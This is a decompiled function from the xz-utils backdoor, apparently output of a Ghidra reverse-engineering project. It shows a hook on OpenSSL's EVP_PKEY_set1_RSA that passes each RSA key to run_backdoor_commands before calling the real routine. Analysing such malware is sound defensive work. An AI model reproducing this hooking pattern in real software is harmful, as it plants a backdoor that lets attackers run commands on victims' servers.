// /home/kali/xzre-ghidra/xzregh/10A2D0_hook_EVP_PKEY_set1_RSA.c
// Function: hook_EVP_PKEY_set1_RSA @ 0x10A2D0
// Calling convention: __stdcall
// Prototype: int __stdcall hook_EVP_PKEY_set1_RSA(EVP_PKEY * pkey, RSA * key)


/*
 * AutoDoc: Generated from reverse engineering.
 *
 * Summary:
 *   Hook that forwards to the real EVP_PKEY_set1_RSA after first giving run_backdoor_commands() a chance to examine the RSA key.
 *
 * Notes:
 *   - Reads the resolved function pointer from global_ctx->imported_funcs and bails out if the table is unavailable.
 *   - When a key is present, invokes the backdoor to decide whether the original call should proceed and then tail-calls the genuine OpenSSL routine.
 */

int hook_EVP_PKEY_set1_RSA(EVP_PKEY *pkey,RSA *key)

{
  pfn_EVP_PKEY_set1_RSA_t UNRECOVERED_JUMPTABLE;
  int iVar1;
  BOOL local_1c;
  
  if (((global_ctx != (global_context_t *)0x0) &&
      (global_ctx->imported_funcs != (imported_funcs_t *)0x0)) &&
     (UNRECOVERED_JUMPTABLE = global_ctx->imported_funcs->EVP_PKEY_set1_RSA,
     UNRECOVERED_JUMPTABLE != (pfn_EVP_PKEY_set1_RSA_t)0x0)) {
    if (key != (RSA *)0x0) {
      run_backdoor_commands(key,global_ctx,&local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a323. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    iVar1 = (*UNRECOVERED_JUMPTABLE)(pkey,key);
    return iVar1;
  }
  return 0;
}

